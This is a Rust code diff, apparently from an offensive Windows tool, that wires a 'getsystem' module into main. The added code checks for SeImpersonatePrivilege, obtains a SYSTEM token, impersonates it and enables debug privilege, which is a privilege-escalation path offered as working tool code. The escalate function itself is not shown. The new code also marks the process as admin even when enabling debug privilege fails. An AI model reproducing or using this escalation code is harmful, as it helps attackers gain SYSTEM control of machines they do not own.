@@ -19,6 +19,7 @@ pub mod syscall;
 mod indirect_lib;
 mod missed_calls;
 mod nodebug;
+mod getsystem;
 
 use std::{
     ffi::c_void,
@@ -94,6 +95,28 @@ fn main() -> Result<()> {
                 Err(_) => {
                     println!("[-] Failed to enable debug privilege");
                 },
+            }
+        }
+
+        // if not admin, try SeImpersonatePrivilege escalation
+        let mut _is_admin = _is_admin;
+        if !_is_admin {
+            if get_privs::has_impersonate_privilege() {
+                match getsystem::escalate() {
+                    Some(system_token) => {
+                        let imp_result = winapi::um::securitybaseapi::ImpersonateLoggedOnUser(
+                            system_token as winapi::shared::ntdef::HANDLE
+                        );
+
+                        if imp_result != 0 {
+                            match get_privs::enable_debug_on_thread_token() {
+                                Ok(_) => { _is_admin = true; },
+                                Err(_) => { _is_admin = true; },
+                            }
+                        }
+                    },
+                    None => {},
+                }
             }
         }
 
